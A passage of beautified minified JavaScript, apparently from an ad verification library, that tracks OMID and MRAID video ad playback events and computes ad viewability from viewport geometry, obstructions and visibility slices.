              e += (t > 0 ? ",{" : "{") + "t:" + n.t + ",rt:" + n.rt + ",tp:" + n.tp + ",sl:" + n.sl + ",ad_duration:" + n.ad_duration + ",volume:" + n.volume + ",devol:" + n.devol + "}";
            }
            return e += "]}";
          }
        },
        D = function () {
          u = !0;
        },
        v = function (e) {
          var d,
            l,
            E,
            p = "start|firstQuartile|midpoint|thirdQuartile|resume|bufferFinish",
            _ = "complete|pause|bufferStart|skipped";
          if (-1 !== ("|" + p + "|" + _ + "|playerStateChange|loaded|volumeChange|").indexOf("|" + e.type + "|")) try {
            var D,
              v = "",
              S = e.hasOwnProperty("timestamp") ? e.timestamp : new Date().getTime(),
              O = S - (g.measurementConfig.birthdate || S + 1),
              R = "n",
              N = !1;
            switch (e.type) {
              case "start":
                v = F.AD_VIDEO_START, f.videoStartArrived = !0, T.getAggregator().trigger(F.OMID_REND_VIDEO_START), o = S, (c = e.data.duration || "0") > 1e3 && (c /= 1e3), a = null != e.data.mediaPlayerVolume ? e.data.mediaPlayerVolume : e.data.videoPlayerVolume, s = null != e.data.deviceVolume ? e.data.deviceVolume : 1;
                break;
              case "volumeChange":
                v = "volumeChanged", a = null != e.data.mediaPlayerVolume ? e.data.mediaPlayerVolume : e.data.videoPlayerVolume, s = null != e.data.deviceVolume ? e.data.deviceVolume : 1;
                break;
              case "firstQuartile":
              case "midpoint":
              case "thirdQuartile":
              case "complete":
                v = "adVideo" + e.type.substring(0, 1).toUpperCase() + e.type.substring(1), N = !0, T.getAggregator().trigger(F.VIDEO_QUARTILE_EVENT, e);
                break;
              case "pause":
              case "bufferStart":
                v = "pauseAd";
                break;
              case "resume":
              case "bufferFinish":
                v = "resumeAd";
                break;
              case "skipped":
                v = "adSkipped";
            }
            if (a = a > 0 && a < .1 ? .1 : parseInt(10 * a) / 10, s = s > 0 && s < .1 ? .1 : parseInt(10 * s) / 10, "" !== v) {
              var y = T.getAggregator().request(x.SCREEN_EVENTS);
              y && (R = y.getCurrentLoc() || R), i.push({
                t: S - o,
                rt: O,
                tp: v,
                sl: R,
                ad_duration: c,
                volume: a,
                devol: s
              });
            }
            if ("loaded" === e.type && I.isDef(e.data)) {
              var C = ["preroll", "midroll", "postroll", "standalone"].indexOf(e.data.position),
                M = -1 !== C ? C + 1 : void 0,
                w = [];
              !0 === e.data.autoPlay ? w.push("autoplayed") : w.push("clicktoplay"), !0 === e.data.skippable && w.push("skippable"), "fullscreen" === e.data.state && w.push("fullscreen");
              var b = w.join(".");
              !0 === u ? (I.isDef(M) && T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.ENVIRONMENT, W.VIDEO_BREAK_POSITION, M), T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.ENVIRONMENT, W.VIDEO_PLAYER_STATE, b)) : (I.isDef(M) && T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
                output: M
              }, W.VIDEO_BREAK_POSITION, {
                type: A.IMPRESSION_EVENT
              }), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
                output: b
              }, W.VIDEO_PLAYER_STATE, {
                type: A.IMPRESSION_EVENT
              }));
            }
            if ("start" === e.type && (T.getAggregator().trigger(F.OMID_AD_DURATION, {
              ad_duration: c
            }), f.adDuration = c), "playerStateChange" === e.type ? D = "fullscreen" === e.data.state ? "AdEnteredFullscreen" : "AdExitedFullscreen" : -1 !== p.indexOf(e.type) ? (D = "AdPlaying", h = !0) : -1 !== _.indexOf(e.type) && (D = "AdPaused", h = !1), "audio" === f.creativeType && "" !== v) {
              var P = (d = A.RENDER.WIDTH_THRESHOLD, l = A.RENDER.HEIGHT_THRESHOLD, (E = {
                type: "geometryChange",
                timestamp: S,
                internallyGenerated: !0,
                treatAsCached: m,
                data: {
                  viewport: {
                    width: d,
                    height: l
                  },
                  adView: {
                    measuringElement: !1,
                    percentageInView: 100,
                    geometry: {
                      x: 0,
                      y: 0,
                      width: d,
                      height: l,
                      obstructions: [],
                      reasons: []
                    },
                    reasons: []
                  }
                }
              }).data.adView.onScreenGeometry = E.data.adView.containerGeometry = E.data.adView.onScreenContainerGeometry = E.data.adView.geometry, E);
              h && 0 !== s && 0 !== a || (P.data.adView.geometry.width = P.data.adView.geometry.height = 0, P.data.adView.percentageInView = 0), T.getAggregator().trigger(F.INTERNALLY_GENERATED_GEOMETRY_EVENT, P);
            }
            m && "loaded" !== e.type && (f.cachedVideoEventsReceived = !0, "start" === e.type && (f.cachedStartEventIndex = f.cachedEvents.length), f.cachedEvents.push(e)), I.isDef(D) && n.trigger(r, {
              eventType: D,
              eventData: null
            }), N && T.getAggregator().trigger(F.SEND_DT, A.DT_CODES.VIDEO_EVENTS);
          } catch (e) {
            __IntegralASDiagnosticCall("omidvideo", e, t.bootstrapper);
          }
        };
      return {
        start: function () {
          T.getAggregator().on(F.IMPRESSION_SENT, D), T.getAggregator().provide({
            omidVideoEventsString: _
          }), m = !0, "audio" === f.creativeType ? p.addEventListener("media", v) : p.addEventListener("video", v), m = !1, f.cachedVideoEventsChecked = !0, f.cachedVideoEventsReceived && f.processCachedEvents(), d.init();
        },
        addVideoPlaybackEventListener: function (e) {
          n.on(r, e);
        }
      };
    },
    jt = function (e, t) {
      "use strict";

      var n = "measurementChanged",
        r = !1,
        i = function (e) {
          return e >= 50;
        },
        o = function (e) {
          var o = e.percentageInView;
          r = !0, e.viewState = function (e) {
            return i(e) ? A.IN_VIEW : A.OUT_OF_VIEW;
          }(o), e.outOfViewReason = i(o) ? "" : A.OUT_OF_VIEW_REASONS.GEOM, t.trigger(n, e);
        };
      return {
        start: function () {
          T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: A.MEDIA_TYPE.DISPLAY_CODE
          }, A.MEDIA_TYPE_CODE, {
            type: A.IMPRESSION_EVENT
          }), e.addScreenLocationChangedListener(o), e.start();
        },
        getStrategyName: function () {
          return A.MEASUREMENT_STRATEGY.DISPLAY;
        },
        addMeasurementChangedListener: function (e) {
          t.on(n, e);
        },
        isMeasurable: function () {
          return r;
        }
      };
    },
    qt = function (e, t, n) {
      "use strict";

      var r = I.isDef(e) ? e.environment : void 0,
        i = I.isDef(e) ? e.measurementStrategy : void 0,
        o = function () {
          return I.isDef(i);
        };
      I.isDef(t) && t.start();
      return {
        hasMeasurementStrategy: o,
        getScreenLocationInfo: function (e) {
          return t.create(e);
        },
        isImmediate: function () {
          return !o() || r.isImmediate();
        },
        isMeasurable: function () {
          return !!o() && i.isMeasurable();
        },
        isMediaType: function (e) {
          return !!o() && r.isMediaType(e);
        },
        supportsAdContainerGeometry: function () {
          return e.environment.supportsAdContainerGeometry();
        },
        start: function () {
          o() && r.start();
        },
        requiresDelayedViewabilityEvent: function () {
          o() && t.requiresDelayedViewabilityEvent();
        }
      };
    },
    Kt = function (e, t, n) {
      "use strict";

      var r = T.getAggregator().request(x.MOBILE_APP);
      return {
        create: function () {
          var t = [];
          t = (t = t.concat(e.getOmidMeasurementStrategies())).concat(e.getMraidMeasurementStrategies());
          var n = new zt(t).resolve();
          n || T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: "0"
          }, W.OMID_APP_MEASUREMENT, {
            type: A.IMPRESSION_EVENT
          });
          var i = new Jt(n);
          return new qt(n, i, r.isMobileAppEnvironment());
        }
      };
    },
    Xt = function (t) {
      "use strict";

      var n = T.getAggregator().request(x.MOBILE_APP);
      return {
        getOmidMeasurementStrategies: function () {
          var t = T.getAggregator().request(x.OMID_VERIFICATION_CLIENT),
            n = new Mt(t),
            r = [];
          if (n.accepts()) {
            var i = new an(),
              o = new cn(),
              a = new Lt(),
              s = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT),
              c = new on(t, new q()),
              u = [{
                environment: i,
                measurementStrategy: new sn(t, new q())
              }, {
                environment: a,
                measurementStrategy: new un(new Un(), We.getWindow(), new q())
              }, {
                environment: o,
                measurementStrategy: new gn(new jn(), We.getWindow(), new q())
              }],
              d = new zt(u).resolve(),
              g = d ? d.measurementStrategy : {},
              f = new tn(new rn(new Er()), new Er(), s.isHtml),
              l = new Ct(t, n, e.mode),
              E = new nn(c, g, new q(), f),
              p = new wt(t, n, e.mode),
              m = new dn(c, g, new Yt(t, new q()), new q(), f);
            r.push({
              environment: l,
              measurementStrategy: E
            }), r.push({
              environment: p,
              measurementStrategy: m
            });
          }
          return r;
        },
        getMraidMeasurementStrategies: function () {
          var e = [],
            t = n.isSafeToInjectMraid(),
            r = new fn(We.getWindow(), t, n.isMobileAppEnvironment());
          if (r.accepts()) {
            var i,
              o = T.getAggregator().request("context"),
              a = new $t(We.getWindow(), o),
              s = new ln(We.getWindow(), new q());
            if (a.accepts()) {
              var c = new Zt(We.getWindow(), new q());
              i = {
                environment: a,
                measurementStrategy: new Qt(s, c, new q())
              };
            } else {
              i = {
                environment: r,
                measurementStrategy: new jt(s, new q())
              };
            }
            e.push(i);
          }
          return e;
        }
      };
    },
    zt = function (e) {
      "use strict";

      return {
        resolve: function () {
          var t = I(e).findFirst(function (e, t) {
            return t.environment.accepts();
          });
          if (I.isDef(t)) return t;
        }
      };
    },
    Jt = function (e) {
      "use strict";

      var t,
        n = !1,
        r = {
          winDimensions: Se({
            scrX: 0,
            scrY: 0,
            width: 0,
            height: 0
          }),
          adDimensions: Se({
            scrX: 0,
            scrY: 0,
            width: 0,
            height: 0
          }),
          containerDimensions: Se({
            scrX: 0,
            scrY: 0,
            width: 0,
            height: 0
          }),
          method: A.NA,
          viewState: A.NA,
          percentInView: A.PIV_NA,
          reason: "",
          obstructed: A.NA,
          isHidden: A.NA,
          tabHidden: A.NA,
          posViewState: A.NA,
          adCompCount: 1
        },
        i = function (e) {
          return e ? new Se({
            scrX: e.x,
            scrY: e.y,
            width: e.width,
            height: e.height
          }) : Se({
            scrX: 0,
            scrY: 0,
            width: 0,
            height: 0
          });
        },
        o = function (e) {
          t = {
            winDimensions: i(e.windowDimensions),
            adDimensions: i(e.adDimensions),
            containerDimensions: i(e.containerDimensions),
            method: e.detectionMethod || A.NA,
            viewState: e.viewState || A.NA,
            percentInView: I.isDef(e.percentageInView) ? e.percentageInView : A.PIV_NA,
            reason: e.outOfViewReason || "",
            obstructed: I.stringifyTriState(e.isObstructed),
            isHidden: A.NA,
            tabHidden: A.NA,
            posViewState: e.viewState || A.NA,
            adCompCount: 1,
            shouldDelegateToDomBasedViewability: e.shouldDelegateToDomBasedViewability,
            sliceStatus: e.sliceStatus,
            isVideoPlaying: e.isVideoPlaying,
            isVideoPlayingInFullscreen: e.isVideoPlayingInFullscreen,
            isSoundOn: e.isSoundOn
          };
          var r = e.omidObstructions;
          I.isDef(r) && "" !== r && (t.omidObstructions = r), e.isMeasurable && (!0, n && (n = !1, T.getAggregator().trigger(F.DELAYED_VIEWABILITY_READY)));
        };
      return {
        create: function (n) {
          var i = r;
          return I.isDef(t) && (e.environment.supportsAdContainerGeometry() ? i = t : t.shouldDelegateToDomBasedViewability ? (i = n).method = t.method : (0 === t.percentInView || t.percentInView >= 75) && (i = t)), i;
        },
        start: function () {
          var t;
          I.isDef(e) && I.isDef(e.measurementStrategy) && ((t = e.measurementStrategy).addMeasurementChangedListener(o), t.start());
        },
        requiresDelayedViewabilityEvent: function () {
          n = !0;
        }
      };
    },
    Qt = function (e, t, n) {
      "use strict";

      var r,
        i,
        o,
        a,
        s = "measurementChanged",
        c = !1,
        u = !1,
        d = !1,
        g = function (e) {
          return e < 50;
        },
        f = function () {
          if (!I.isUndef(i)) {
            var e,
              t,
              f = [];
            c ? (u ? (t = !1, e = 100) : (t = a, e = o), g(e) && f.push(A.OUT_OF_VIEW_REASONS.GEOM)) : (t = !1, e = 0, f.push(A.OUT_OF_VIEW_REASONS.VIDEO)), d = !0, i.shouldDelegateToDomBasedViewability = t, i.percentageInView = e, i.viewState = function (e) {
              return g(e) ? A.OUT_OF_VIEW : A.IN_VIEW;
            }(e), i.outOfViewReason = f.join("."), r = i, n.trigger(s, r);
          }
        },
        l = function (e) {
          i = e, o = e.percentageInView, a = e.shouldDelegateToDomBasedViewability, f();
        },
        E = function (e) {
          var t = e.eventType;
          "AdEnteredFullscreen" === t ? u = !0 : "AdExitedFullscreen" === t ? u = !1 : -1 !== "AdStarted|AdVideoStart|AdPlaying".indexOf(t) ? c = !0 : -1 !== "AdSkipped|AdUserClose|AdPaused|AdVideoComplete|AdStopped".indexOf(t) && (c = !1), f();
        };
      return {
        start: function () {
          T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: A.MEDIA_TYPE.VIDEO_CODE
          }, A.MEDIA_TYPE_CODE, {
            type: A.IMPRESSION_EVENT
          }), e.addScreenLocationChangedListener(l), e.start(), t.addVideoPlaybackEventListener(E), t.start();
        },
        getStrategyName: function () {
          return A.MEASUREMENT_STRATEGY.VIDEO;
        },
        addMeasurementChangedListener: function (e) {
          n.on(s, e);
        },
        isMeasurable: function () {
          return d;
        }
      };
    },
    $t = function (e, t) {
      "use strict";

      return {
        accepts: function () {
          return t.isInMobiMraidVideo();
        },
        isImmediate: function () {
          return !1;
        },
        supportsAdContainerGeometry: function () {
          return !1;
        },
        start: function () {
          try {
            var t;
            e.inmobi.IASDocumentVideoBuffer.addVideoEventListener(function (e) {
              "AdVideoStart" !== e.type || t || (t = !0, T.getAggregator().trigger(F.AD_IMPRESSION));
            });
          } catch (e) {}
        }
      };
    },
    Zt = function (e, t) {
      "use strict";

      var n = "inMobiMraidVideoPlaybackEvent",
        r = function (e) {
          try {
            var r = e.type;
            t.trigger(n, {
              eventType: r
            });
          } catch (e) {}
        };
      return {
        start: function () {
          try {
            e.inmobi.IASDocumentVideoBuffer.addVideoEventListener(r);
          } catch (e) {}
        },
        addVideoPlaybackEventListener: function (e) {
          t.on(n, e);
        }
      };
    };
  const en = (e, t) => {
    let n = [],
      r = 0,
      i = 0;
    if (e && t && "number" == typeof e.x && "number" == typeof e.y && "number" == typeof e.width && "number" == typeof e.height) {
      const o = e.x,
        a = e.x + e.width,
        s = e.y,
        c = e.y + e.height;
      for (; r < t.length; r++) {
        const u = t[r];
        if (u && "number" == typeof u.x && "number" == typeof u.y && "number" == typeof u.width && "number" == typeof u.height) {
          const t = u.x,
            r = u.x + u.width,
            d = u.y,
            g = u.y + u.height;
          if (t >= a || r <= o || d >= c || g <= s) continue;
          t < o && (u.x = e.x, u.width = u.width - (o - t)), r > a && (u.width = u.width - (r - a)), d < s && (u.y = e.y, u.height = u.height - (s - d)), g > c && (u.height = u.height - (g - c)), n[i] = u, i++;
        }
      }
    } else t && (n = t);
    return n;
  };
  var tn = function (e, t, n) {
      "use strict";

      var r = function (e, t) {
          var n = Math.max(e.x, t.x),
            r = Math.max(e.y, t.y),
            i = Math.min(e.x + e.width, t.x + t.width) - n,
            o = Math.min(e.y + e.height, t.y + t.height) - r;
          return {
            x: n,
            y: r,
            width: i > 0 ? i : 0,
            height: o > 0 ? o : 0
          };
        },
        i = function (e, t, n) {
          var i = r(t, e);
          return r(n, {
            x: 0,
            y: 0,
            width: i.width,
            height: i.height
          });
        },
        o = function (e, t) {
          var n = Ae.isOmidForWeb(),
            r = !Ae.isOmidSandboxedEnvironment(),
            i = n && r;
          return {
            x: i ? t.x : e.x + t.x,
            y: i ? t.y : e.y + t.y,
            width: t.width,
            height: t.height
          };
        },
        a = function (e, t) {
          return {
            x: t.x - e.x,
            y: t.y - e.y,
            width: t.width,
            height: t.height
          };
        };
      function s(e, t, n) {
        var r = a(t, n),
          o = i(e, t, r);
        return o.width * o.height;
      }
      var c = function (e) {
          return u(e) ? A.IN_VIEW : A.OUT_OF_VIEW;
        },
        u = function (e) {
          return e >= 50;
        };
      return {
        calculateGeometricMeasurement: function (r, d) {
          if (I.isDef(r) && I.isDef(d)) {
            var g,
              f,
              l = r.viewport,
              E = r.computedAdContainer,
              p = E.obstructions,
              m = r.omidObstructions,
              h = p && p.length > 0,
              T = r.originalAdContainer,
              _ = d.adGeometry,
              D = d.adFound,
              v = r.detectionMethod,
              S = 0,
              O = {
                x: 0,
                y: 0,
                width: l.width,
                height: l.height
              },
              R = o(T, _),
              N = r.outOfViewReason,
              y = 0,
              C = 0,
              M = h || !1,
              w = _.width * _.height <= 1;
            return n && w && (N = function (e, t) {
              var n = e || "";
              return t || -1 !== n.indexOf(A.OUT_OF_VIEW_REASONS.GEOM) || (n = A.OUT_OF_VIEW_REASONS.GEOM + ("" !== n ? "." + n : "")), n;
            }(N, D = !1)), D && r.percentageInView > 0 ? (y = s(O, E, R), C = h ? function (t, n, r, s) {
              var c = a(n, r),
                u = i(t, n, c),
                d = o(n, u);
              return e.calculateObstructedArea(d, s);
            }(O, E, R, p) : 0, S = Math.round((y - C) / (R.width * R.height) * 100), h && 0 === C && (M = !1), f = function (n, r, i, o) {
              var a,
                c,
                u,
                d,
                g = 0,
                f = t.getConfig(i).numberOfSlices,
                l = We.floor(i.height / f) || 1,
                E = [],
                p = o ? e.getObstructionStatusBySlice(f) : [];
              for (g = 0; g < f; g++) d = i.y + l * g, g == f - 1 && (l = i.y + i.height - d), c = s(n, r, a = {
                x: i.x,
                y: d,
                width: i.width,
                height: l
              }) / (a.width * a.height) == 1, E.push(c);
              if (o) for (u = We.min(p.length, f), g = 0; g < u; g++) E[g] = E[g] && !p[g];
              return E;
            }(O, E, new Se(R).getRoundedGeometry(), M)) : f = t.getConfig(_).defaultSliceArray, g = {
              windowDimensions: O,
              containerDimensions: T,
              adDimensions: R,
              percentageInView: S,
              viewState: c(S),
              outOfViewReason: u(S) ? "" : N || A.OUT_OF_VIEW_REASONS.GEOM,
              detectionMethod: v,
              isObstructed: M,
              sliceStatus: f
            }, I.isDef(m) && "" !== m && (g.omidObstructions = m), g;
          }
        }
      };
    },
    nn = function (e, t, n, r) {
      "use strict";

      var i,
        o,
        a,
        s = "geometryMeasurementChanged",
        c = function () {
          if (I.isDef(i) && I.isDef(o)) {
            var e = r.calculateGeometricMeasurement(i, o);
            e.isMeasurable = !0, a = !0, n.trigger(s, e);
          }
        },
        u = function (e) {
          i = e, c();
        },
        d = function (e) {
          o = e, c();
        };
      return {
        start: function () {
          T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: A.MEDIA_TYPE.DISPLAY_CODE
          }, A.MEDIA_TYPE_CODE, {
            type: A.IMPRESSION_EVENT
          }), e.addAdContainerGeometryMeasurementChangedListener(u), e.start(), t.addAdGeometryMeasurementChangedListener(d), t.start();
        },
        addMeasurementChangedListener: function (e) {
          n.on(s, e);
        },
        getStrategyName: function () {
          return A.MEASUREMENT_STRATEGY.DISPLAY;
        },
        isMeasurable: function () {
          return a;
        }
      };
    },
    rn = function (e) {
      "use strict";

      var t,
        n = [],
        r = function (e, t) {
          for (var n = o(e, t), r = n.x - e.x, i = n.y - e.y, a = r + n.width, s = i + n.height, c = Math.round(r); c < Math.round(a); c++) for (var u = Math.round(i); u < Math.round(s); u++) void 0 !== e.matrix[c] && void 0 === e.matrix[c][u] && (e.matrix[c][u] = 1, e.obscuredPixelCount += 1);
          return e;
        },
        i = function (e) {
          for (var t = Math.round(e.width), n = Math.round(e.height), r = new Array(t), i = 0; i < t; i++) r[i] = new Array(n);
          return {
            matrix: r,
            obscuredPixelCount: 0,
            x: Math.round(e.x),
            y: Math.round(e.y),
            width: t,
            height: n
          };
        },
        o = function (e, t) {
          var n = Math.max(e.x, t.x),
            r = Math.max(e.y, t.y),
            i = Math.min(e.x + e.width, t.x + t.width) - n,
            o = Math.min(e.y + e.height, t.y + t.height) - r;
          return {
            x: n,
            y: r,
            width: i > 0 ? i : 0,
            height: o > 0 ? o : 0
          };
        },
        a = function (e, t, n) {
          return e + (t - n);
        },
        s = function (e, t, n, r) {
          return e == t || n === r - 1;
        },
        c = function (t) {
          if (I.isUndef(t.matrix) || 0 === t.matrix.length) return [];
          for (var n = 0, r = !1, i = t.matrix[0].length, o = t.matrix.length, c = e.getConfig({
              height: i
            }).numberOfSlices, u = We.floor(i / c) || 1, d = [], g = 0; g < i; g++) {
            r = !1;
            for (var f = 0; f < o; f++) if (1 === t.matrix[f][g]) {
              r = !0;
              break;
            }
            n++, r && (g = a(g, u, n), n = u), s(n, u, g, i) && (d.push(r), n = 0, r = !1);
          }
          return d;
        };
      return {
        calculateObstructedArea: function (e, o) {
          var a,
            s = o && o.length > 0,
            u = s ? i(e) : {},
            d = 0,
            g = 0;
          if (s) {
            for (; d < o.length; d++) a = o[d], u = r(u, a);
            g = u.obscuredPixelCount, t = c(u);
          } else t = n;
          return g;
        },
        getObstructionStatusBySlice: function () {
          return t;
        }
      };
    },
    on = function (t, n) {
      "use strict";

      var r = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT);
      r.geometryChangeEvents = [];
      var i = null,
        o = !1,
        a = We.getWindow(),
        s = a && a.omid3p,
        c = !!(s && I.isFunction(s.registerSessionObserver) && I.isFunction(s.addEventListener)) ? s : t,
        u = new Ar(),
        d = !1,
        f = !1,
        l = function () {
          var t = We.getDoc().getElementById("iasbi" + e.asid);
          t && t.hasAttribute("CreativeLoaded") ? (r.delayingViewabilityEvents = !1, o = !1, i && (E(i), i = null)) : We.setTimeout(l, 50);
        },
        E = function (e) {
          if (e && "geometryChange" === e.type && e.data && e.data.adView) {
            var t = e.data.adView;
            if (t.onScreenGeometry && t.onScreenGeometry.obstructions && t.onScreenGeometry.obstructions.length > 0 && (t.onScreenGeometry.obstructions = en(t.geometry, t.onScreenGeometry.obstructions)), "audio" !== r.creativeType || e.internallyGenerated) {
              var a = d || e.treatAsCached;
              a && (r.cachedGeometryEventsReceived || (r.cachedFirstGeometricIndex = r.cachedEvents.length), r.cachedGeometryEventsReceived = !0, r.cachedEvents.push(e));
              var s = !!(t.measuringElement && t.containerGeometry && t.onScreenContainerGeometry),
                c = r.cachedStartEventIndex;
              if (!a && r.unrecoveredPlayTime && c > -1 && t.percentageInView >= 50 && "audio" !== r.creativeType) {
                var f = We.now() - r.cachedEvents[c].timestamp,
                  E = T.getAggregator().request(x.SCREEN_EVENTS);
                E && E.setRecoveredTimeInSlTimes && E.setRecoveredTimeInSlTimes(f);
              }
              if (r.geometryChangeEvents.length < 10 && (r.geometryChangeEvents.push(e.timestamp - g.measurementConfig.birthdate + "." + t.percentageInView), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
                output: r.geometryChangeEvents.join("_")
              }, W.GEOMETRY_EVENTS_RECEIVED)), r.delayingViewabilityEvents) i = e, o || (o = !0, l());else {
                var m = [];
                t.onScreenGeometry && t.onScreenGeometry.obstructions && t.onScreenGeometry.obstructions.length > 0 && (s && !t.onScreenContainerGeometry.obstructions && (t.onScreenContainerGeometry.obstructions = t.onScreenGeometry.obstructions), t.reasons && t.reasons.indexOf("obstructed") > -1 && t.percentageInView < 100 && (t.onScreenGeometry.obstructions = t.onScreenGeometry.obstructions.slice(0, 4), I(t.onScreenGeometry.obstructions).each(function (e, t) {
                  m.push(Math.round(t.x) + "." + Math.round(t.y) + "." + Math.round(t.width) + "." + Math.round(t.height));
                })));
                var h = Ae.isOmidForWeb() ? Oe.calcWinDims() : {
                    width: 0,
                    height: 0
                  },
                  _ = new Se(e.data.viewport || h),
                  D = new Se(s ? t.containerGeometry : t.geometry || {
                    x: 0,
                    y: 0,
                    width: 0,
                    height: 0
                  }),
                  v = new Se(s ? t.onScreenContainerGeometry : t.onScreenGeometry || {
                    x: 0,
                    y: 0,
                    width: 0,
                    height: 0
                  }),
                  S = {
                    viewport: _.getRoundedGeometry(),
                    originalAdContainer: D.getRoundedGeometry(),
                    computedAdContainer: v.getRoundedGeometry(),
                    percentageInView: t.percentageInView,
                    detectionMethod: A.DETECTION_METHODS.OMID,
                    outOfViewReason: p(t.reasons),
                    omidObstructions: m.join("_")
                  };
                void 0 === r.geometryArrived && u.checkForViewAttachmentBasedOnAdSessionType(r, e.data.adView) && (r.geometryArrived = !0, T.getAggregator().trigger("omidrendgeoupdate")), n.trigger(A.CONTAINER_GEOMETRY_MEASUREMENT_CHANGED, S);
              }
            }
          }
        },
        p = function (e) {
          var t = {
              inactive: A.OUT_OF_VIEW_REASONS.FOCUS,
              viewport: A.OUT_OF_VIEW_REASONS.GEOM,
              clipped: A.OUT_OF_VIEW_REASONS.GEOM,
              obstructed: A.OUT_OF_VIEW_REASONS.OBSTRUCTION,
              backgrounded: A.OUT_OF_VIEW_REASONS.FOCUS,
              notFound: A.OUT_OF_VIEW_REASONS.HIDDEN,
              hidden: A.OUT_OF_VIEW_REASONS.HIDDEN,
              noWindowFocus: A.OUT_OF_VIEW_REASONS.WINDOW
            },
            n = [];
          return e ? (I(e).each(function (e, r) {
            var i = t[r];
            i && n.indexOf(n) < 0 && n.push(i);
          }), n.join(".")) : "";
        };
      r.processCachedEvents = function () {
        if (!f) {
          var e = "video" === r.mediaType,
            t = r.supports && r.supports.join().indexOf("clid") > -1,
            n = "limited" === r.accessMode,
            i = "full" === r.accessMode,
            o = n || i && t,
            a = !e || r.cachedVideoEventsChecked,
            s = r.cachedGeometryEventsChecked;
          if (o && s && a && r.cachedEvents.length > 0) {
            var c = "o",
              u = "o",
              d = 0,
              g = 0,
              l = 0,
              E = !e,
              p = !1,
              m = We.now();
            if (e) {
              var I = r.cachedStartEventIndex,
                h = r.cachedFirstGeometricIndex,
                A = r.cachedEvents[h],
                _ = r.cachedEvents[I];
              A && _ && A.timestamp > _.timestamp && (A.timestamp = _.timestamp);
            }
            for (var D = 0; D < r.cachedEvents.length; D++) {
              for (var v = m, S = -1, O = 0; O < r.cachedEvents.length; O++) !r.cachedEvents[O].alreadyOrdered && r.cachedEvents[O].timestamp < v && (v = r.cachedEvents[O].timestamp, S = O);
              if (-1 !== S) {
                var R = r.cachedEvents[S];
                R.alreadyOrdered = !0, "geometryChange" === R.type && R.data && R.data.adView ? (d = R.data.adView.percentageInView, p = !0) : E = "start|firstQuartile|midpoint|thirdQuartile|resume|bufferFinish".indexOf(R.type) > -1, u = d && d >= 50 && E ? "i" : "o", "o" === c && "i" === u ? g = R.timestamp : "i" === c && "o" === u ? l += R.timestamp - g : "i" === c && "i" === u && (l += R.timestamp - g, g = R.timestamp), c = u;
              }
            }
            if (f = !0, "i" === c ? l += m - g : e && !p && r.cachedStartEventIndex > -1 && (r.unrecoveredPlayTime = !0), l > 0) {
              "audio" === r.creativeType && (l = Math.min(l, m - A.timestamp)), r.recoveredTime = l;
              var N = T.getAggregator().request(x.SCREEN_EVENTS);
              N && N.setRecoveredTimeInSlTimes && (N.setRecoveredTimeInSlTimes(l), r.recoveredTime = -1);
            }
          }
        }
      };
      return {
        start: function () {
          d = !0, void 0 !== r.impressionViewabilityMeasurement && E(r.impressionViewabilityMeasurement), c.addEventListener("geometryChange", E), d = !1, r.cachedGeometryEventsChecked = !0, r.cachedGeometryEventsReceived && r.processCachedEvents(), T.getAggregator().on(F.INTERNALLY_GENERATED_GEOMETRY_EVENT, E);
        },
        addAdContainerGeometryMeasurementChangedListener: function (e) {
          n.on(A.CONTAINER_GEOMETRY_MEASUREMENT_CHANGED, e);
        },
        translateOmidOutOfViewReasons: p
      };
    },
    an = function () {
      "use strict";

      var e = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT);
      return {
        accepts: function () {
          return e && (e.isNative || e.isLimitedSandbox);
        }
      };
    },
    sn = function (t, n) {
      "use strict";

      var r = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT),
        i = null,
        o = !1,
        a = We.getWindow(),
        s = a && a.omid3p,
        c = !!(s && I.isFunction(s.registerSessionObserver) && I.isFunction(s.addEventListener)) ? s : t,
        u = new Ar(),
        d = function () {
          var t = We.getDoc().getElementById("iasbi" + e.asid);
          t && t.hasAttribute("CreativeLoaded") ? (r.delayingViewabilityEvents = !1, o = !1, i && (g(i), i = null)) : We.setTimeout(d, 50);
        },
        g = function (e) {
          if (e && "geometryChange" === e.type && e.data && e.data.adView && ("audio" !== r.creativeType || e.internallyGenerated)) if (e.data.adView.onScreenGeometry && e.data.adView.onScreenGeometry.obstructions && e.data.adView.onScreenGeometry.obstructions.length > 0 && (e.data.adView.onScreenGeometry.obstructions = en(e.data.adView.geometry, e.data.adView.onScreenGeometry.obstructions)), r.delayingViewabilityEvents) i = e, o || (o = !0, d());else {
            var t = e.data.adView.geometry,
              a = e.data.adView.containerGeometry,
              s = !!t,
              c = e.data.adView.measuringElement && !!a,
              g = new Se({
                x: s && c ? t.x - a.x : 0,
                y: s && c ? t.y - a.y : 0,
                width: s ? t.width : 0,
                height: s ? t.height : 0
              }).getRoundedGeometry();
            g, void 0 === r.geometryArrived && u.checkForViewAttachmentBasedOnAdSessionType(r, e.data.adView) && (r.geometryArrived = !0, T.getAggregator().trigger("omidrendgeoupdate")), n.trigger(A.OMID_GEOMETRY_MEASUREMENT_CHANGED, {
              adGeometry: g,
              adFound: s
            });
          }
        };
      return {
        start: function () {
          void 0 !== r.impressionViewabilityMeasurement && g(r.impressionViewabilityMeasurement), c.addEventListener("geometryChange", g), T.getAggregator().on(F.INTERNALLY_GENERATED_GEOMETRY_EVENT, g);
        },
        addAdGeometryMeasurementChangedListener: function (e) {
          n.on(A.OMID_GEOMETRY_MEASUREMENT_CHANGED, e);
        }
      };
    },
    cn = function () {
      "use strict";

      var e = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT);
      return {
        accepts: function () {
          return e && !e.isNative;
        }
      };
    },
    un = function (e, t, n) {
      "use strict";

      var r;
      var i = function () {
        var t,
          i,
          o,
          a = e.find(),
          s = !1;
        I.isDef(a) && null !== a ? (o = !0, t = {
          x: (i = a.getBoundingClientRect()).x || i.left,
          y: i.y || i.top,
          width: i.width,
          height: i.height
